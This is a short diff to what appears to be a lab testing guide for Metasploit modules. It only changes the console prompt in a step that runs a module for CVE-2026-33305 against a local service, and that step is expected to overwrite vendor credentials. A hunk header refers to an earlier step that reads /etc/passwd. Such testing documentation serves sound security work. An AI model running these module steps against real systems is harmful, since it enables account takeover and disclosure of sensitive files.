@@ -117,12 +117,12 @@ Expected: contents of /etc/passwd returned in module output.
 
 ## Step 4 - Run CVE-2026-33305 Module (Credential Injection)
 
-    msf6 > use auxiliary/gather/cve_2026_33305_save_setup
-    msf6 > set RHOSTS 127.0.0.1
-    msf6 > set RPORT 8300
-    msf6 > set USERNAME admin
-    msf6 > set PASSWORD pass
-    msf6 > run
+    msf > use auxiliary/gather/cve_2026_33305_save_setup
+    msf > set RHOSTS 127.0.0.1
+    msf > set RPORT 8300
+    msf > set USERNAME admin
+    msf > set PASSWORD pass
+    msf > run
 
 Expected: vendor credentials overwritten; module confirms write success.
 
